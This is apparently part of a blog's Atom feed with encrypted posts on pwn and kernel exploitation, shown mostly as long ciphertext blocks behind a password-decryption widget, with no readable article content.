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 </div>]]></content>
    
    <summary type="html">
    
      The article has been encrypted, please enter your password to view.&lt;br&gt;
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>kernel pwn快速上手指南一</title>
    <link href="https://nocbtm.github.io/2020/04/16/kernel-pwn-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/"/>
    <id>https://nocbtm.github.io/2020/04/16/kernel-pwn-学习笔记一/</id>
    <published>2020-04-16T08:49:37.000Z</published>
    <updated>2020-04-17T13:04:12.776Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">该文章被加密了，请联系管理员请求密码.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none"> U2FsdGVkX19t2q4bag7+d44AKvzpp8LmzOyccJ97jpwJYFh2SMPazZDVKahzM3q14DTp5ENn1hEUi61zu1Ho9AxMww0vMROiqzA1ITLhtVnintPGJjhPr/ZWkrg71OZ/D6/qq7Lh87V6g25eFi6lBv1ZS7qbHfid3pbd7kLEi5/uxufETXFKD5e3yC1i1R2rW1bnA8Z1Pf/OsNxD4XBlQ/15Jklh9++ULAxV//kw2SF8Bsh/9mjRyJVJiM+BsvDiGP5z7oNTNvM4ToRfIJ0itTNWE8yyGc+bSSIqeYgYOYEFck9q/k455O/wK47FsUkoCTlgw/a0cGJnxuzToeO16yfW5dES3x5svMGX7egp0xCHT1/dkwS54oWo8AlfmZuH+t4Rjq/ezng4SfOAkpOz4+wfXbpBuCoCuXJsh136I5jlTnIS+n9ERWfdfOX6MLW1+A/viCkqUji1uaCK7MkBCzjkty/HuWkvDyj1p+4DgBJ7KJ720SH3NtFRCfMMhWXbYqnGQXkDyCNQ+lO0ymej0aCUUmz1HDB2c0ER2Hn3rJwFF9LujZEqDsImowEJ3JVeodQEuxcJL1JIdPCdpGQP+EQ4YWeWHXoYZfhmTPbsGBEPZKlUOUwdBpmO1hKsh0MOtepBH/OeEYcHpDOztTzxdX2wvbbcEa9cagq6/hEpP2sX3+8QbFCjM3ddeBTMBazTweZ4KVJ1kR4AOtc4XZj2lx3k25itaD5X9m1gpi1c6so3h35DyIH8N30dK7P8YvFAJCdPSBpWEBZoRhul7AS4M9HNiPYar17AiqjgiExw1J1p8cywN+oRjAewSyUQYYW483hXEkl8WGJ8OygXujayJ9EQMOSYuwsxdAIZq+dSBOz02u24FEugabD6mA4r8fq9bP838D0EWnxMAZEyRycaYHXMuBvrktb4I3akmWg5mc+gKYLb+kDyUNa2ANHXEkw0YMaIAntoDzLXfEeJnv4DxNn56FZuW5ls/8uilpPmxZG6a1lg7QFbhZRu8ORhe5k1GRDvsHQ6AyDW/07Y4EgIkdvBM5n407g+uwDuADTWLJeo6Y7xi+vEd8mRFwC4kQHkcReiOJsmGjSyBNHENgU9xf6iABFQ9aRe6aFaVu7UzmTwisw+5UIMdsikwODufWIxPdDRwtsniP0zX5zMjxfUK3ensJr6Y/uNwQsJAZ4tkdeXzJNNIURxakdMFQKn3vqEO2sOs2X/hb88Fykkz059KXtB41D79RP2H7LQubOyfx9f9zersFRrD9TXjsnSTR7Vwg/XGE2WFbQM5/JzYcuZTAC8MfyKFd1lZYrdJL1xtXjfNgV0x5yu+gAWJZL68dgFPVh+tV9r0eMaiYWasiYMuSYx+PttYdqUzbjfOHQ19M0do6p5iVaurk